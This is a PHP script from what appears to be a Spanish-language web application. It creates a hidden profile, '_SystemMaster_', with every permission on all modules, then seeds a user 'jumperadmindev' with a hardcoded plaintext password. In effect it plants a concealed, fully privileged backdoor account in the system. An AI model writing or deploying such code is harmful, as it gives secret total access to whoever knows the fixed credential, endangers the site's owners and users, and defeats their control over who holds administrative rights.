<?php
require_once "controladores/usuarios.controlador.php";
require_once "modelos/usuarios.modelo.php";
require_once "modelos/conexion.php";
require_once "modelos/perfiles.modelo.php";

$conn = Conexion::conectar();

// Check if profile exists
$stmtCheck = $conn->prepare("SELECT id FROM perfiles WHERE nombre = '_SystemMaster_'");
$stmtCheck->execute();
$perfil = $stmtCheck->fetch();

if (!$perfil) {
    // 1. Create _SystemMaster_ Profile
    $stmt = $conn->prepare("INSERT INTO perfiles (nombre, descripcion, es_sistema) VALUES ('_SystemMaster_', 'Perfil Oculto Desarrollador', 1)");
    $stmt->execute();
    $idPerfil = $conn->lastInsertId();

    // 2. Add full permissions for all modules
    $modulos = ModeloPerfiles::mdlObtenerModulos();
    $stmtPermisos = $conn->prepare("
        INSERT INTO perfiles_permisos 
        (id_perfil, modulo, puede_ver, puede_crear, puede_editar, puede_eliminar, puede_imprimir, puede_exportar) 
        VALUES (:id_perfil, :modulo, :ver, :crear, :editar, :eliminar, :imprimir, :exportar)
    ");
    foreach($modulos as $modulo => $name) {
        $stmtPermisos->bindValue(':id_perfil', $idPerfil, PDO::PARAM_INT);
        $stmtPermisos->bindValue(':modulo', $modulo);
        $stmtPermisos->bindValue(':ver', 1, PDO::PARAM_INT);
        $stmtPermisos->bindValue(':crear', 1, PDO::PARAM_INT);
        $stmtPermisos->bindValue(':editar', 1, PDO::PARAM_INT);
        $stmtPermisos->bindValue(':eliminar', 1, PDO::PARAM_INT);
        $stmtPermisos->bindValue(':imprimir', 1, PDO::PARAM_INT);
        $stmtPermisos->bindValue(':exportar', 1, PDO::PARAM_INT);
        $stmtPermisos->execute();
    }
}

// 3. Check if user exists
$stmtCheckUser = $conn->prepare("SELECT id FROM usuarios WHERE usuario = 'jumperadmindev'");
$stmtCheckUser->execute();
$usuario = $stmtCheckUser->fetch();

if (!$usuario) {
    $password = "578963214";
    $hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

    $stmtUsuario = $conn->prepare("
        INSERT INTO usuarios 
        (nombre, usuario, password, perfil, estado, id_bodega, foto) 
        VALUES ('Desarrollador Master', 'jumperadmindev', :hash, '_SystemMaster_', 1, 1, '')
    ");
    $stmtUsuario->bindValue(':hash', $hash);
    $stmtUsuario->execute();
    echo "User created successfully.\n";
} else {
    echo "User already exists.\n";
}
